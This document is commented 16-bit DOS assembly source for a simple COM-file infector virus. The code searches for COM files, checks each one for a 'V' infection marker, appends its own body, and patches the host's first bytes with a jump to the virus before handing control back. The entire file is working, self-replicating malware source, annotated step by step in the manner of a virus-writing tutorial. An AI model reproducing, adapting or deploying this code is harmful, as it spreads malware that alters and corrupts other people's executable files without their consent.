

;This program is a basic virus that infects just COM files. It gets the first
;five bytes of its host and stores them elsewhere in the program and puts a
;jump to it at the start, along with the letters "VI", which are used to
;by the virus to identify an already infected program.


MAIN    SEGMENT BYTE
        ASSUME  CS:MAIN,DS:MAIN,SS:NOTHING

        ORG     100H

;This is a shell of a program which will release the virus into the system.
;All it does is jump to the virus routine, which does its job and returns to
;it, at which point it terminates to DOS.

HOST:
        jmp     NEAR PTR VIRUS_START            ;Note: MASM is too stupid to assemble this correctly
        db      'V'
        mov     ah,4CH
        mov     al,0
        int     21H             ;terminate normally with DOS

        DB      100H dup (?)
VIRUS:                          ;this is a label for the first byte of the virus

COMFILE DB      '*.COM',0       ;search string for a com file

VIRUS_START:
        call    GET_START       ;get start address - this is a trick to determine the location of the start of this program
GET_START:                      ;put the address of GET_START on the stack with the call,
        mov     bp,sp
        sub     sp,49
        sub     WORD PTR [bp],OFFSET GET_START - OFFSET VIRUS  ;which is overlayed by VIR_START. Subtract offsets to get @VIRUS
        mov     dx,OFFSET DTA   ;put DTA at the end of the virus for now
        call    NEW_DTA

        mov     si,[bp]         ;move start code to start of program in memory now,
        mov     dx,si
        add     si,OFFSET START_CODE - OFFSET VIRUS     ;in preparation for control transfer
        mov     di,OFFSET HOST
        movsw
        movsw

FIND_FILE:
;        mov     dx,[bp]
        mov     cx,3FH          ;search for any file, no matter what the attributes
        mov     ah,4EH          ;do DOS search first function
        int     21H

FF_LOOP:
        jc      EXIT_VIRUS      ;DOS return failed, return with c set

        mov     dx,OFFSET FNAME                         ;first open the file
        mov     ax,3D02H                                ;r/w access open file, since we'll want to write to it
        int     21H
        jc      FOK_CEND2                               ;error opening file - quit and say this file can't be used

        mov     bx,ax                                   ;put file handle in bx, and leave it there for the duration
        mov     cx,4                                    ;next read 4 bytes at the start of the program
        mov     dx,OFFSET START_IMAGE                   ;and store them here
        mov     ah,3FH                                  ;DOS read function
        int     21H

        mov     ax,WORD PTR [bp-23]                     ;get the file size of the host
        add     ax,OFFSET ENDVIRUS - OFFSET VIRUS       ;and add the size of the virus to it
        jc      FOK_CEND                                ;c set if ax overflows, which will happen if size goes above 64K

        cmp     BYTE PTR [bp-4],0E9H             ;size ok - is first byte a near jump op code?
        jnz     INFECT                                  ;not a near jump, file must be ok, exit with z set

        cmp     BYTE PTR [bp-1],56H            ;ok, is 'V' in position 3?
        jnz     INFECT

FOK_CEND:                                               ;exit with c
        mov     ah,3EH
        int     21H                                     ;and close the file if not valid
FOK_CEND2:
        mov     ah,4FH          ;not a valid file, so
        int     21H             ;do find next function
        jmp     FF_LOOP         ;and go test next file for validity

EXIT_VIRUS:
        mov     WORD PTR [bp],100H                      ;set up stack to do return to host program

        add     sp,49
        mov     dx,80H          ;fix the DTA so that the host program doesn't
NEW_DTA:
        mov     ah,1AH          ;get confused and write over its data with
        int     21H             ;file i/o or something like that!
RET_CODE:
        ret                                             ;and return to host



START_CODE:                     ;move first 5 bytes from host program to here
        nop                     ;nop's for the original assembly code
        nop                     ;will work fine
        nop
        nop


;--------------------------------------------------------------------------
;This routine moves the virus (this program) to the end of the COM file
;Basically, it just copies everything here to there, and then goes and
;adjusts the 5 bytes at the start of the program and the five bytes stored
;in memory.
;
INFECT:
        xor     cx,cx                                   ;prepare to write virus on new file; positon file pointer
        mov     dx,cx                                   ;cx:dx pointer = 0
        mov     ax,4202H                                ;locate pointer to end DOS function
        int     21H

        mov     di,[bp]                                 ;move 4 bytes from start_image to start_code
        add     di,OFFSET START_CODE - OFFSET VIRUS
        mov     si,OFFSET START_IMAGE
        movsw
        movsw

        mov     cx,OFFSET FINAL - OFFSET VIRUS          ;now write the virus; cx=number of bytes to write
        mov     dx,[bp]                                 ;ds:dx = place in memory to write from
        mov     ah,40H                                  ;DOS write function
        int     21H

        xor     cx,cx                                   ;now go back to the start of host program
        mov     dx,cx                                   ;so we can put the jump to the virus in
        mov     ax,4200H                                ;locate file pointer function
        int     21H

        mov     BYTE PTR [bp-4],0E9H                    ;first the near jump op code E9
        mov     ax,WORD PTR [bp-23]                     ;and then the relative address
        add     ax,OFFSET VIRUS_START-OFFSET VIRUS-3    ;these go in the START_IMAGE area
        mov     WORD PTR [bp-3],ax
        mov     BYTE PTR [bp-1],56H                     ;and put 'V' ID code in

        mov     cx,4                                    ;ok, now go write the 4 bytes we just put in START_IMAGE
        mov     dx,OFFSET START_IMAGE                   ;ds:dx = pointer to START_IMAGE
        mov     ah,40H                                  ;DOS write function
        int     21H

        mov     ah,3EH
        int     21H                                     ;and close the file

        jmp     SHORT EXIT_VIRUS                        ;exit

FINAL:                                  ;label for last byte of code to be kept in virus when it moves

ENDVIRUS        EQU     $ + 211         ;label for determining space needed by virus
                                        ;Note: 212 = FFFF - FF2B - 1 = size of data space
                                        ;      $ gives approximate size of code required for virus

        ORG     0FF2BH

VSTACK          DW      50H dup (?)             ;stack for the virus program
DTA             DB      1AH dup (?)             ;this is a work area for the search function
FSIZE           DW      ?,?                     ;file size storage area
FNAME           DB      13 dup (?)              ;area for file path
                DW      ?                       ;file handle
START_IMAGE     DB      ?,?,?,?                 ;an area to store 3 bytes for reading and writing to file
VIR_START       DW      ?                       ;start address of VIRUS (overlays the stack)


MAIN    ENDS


        END HOST

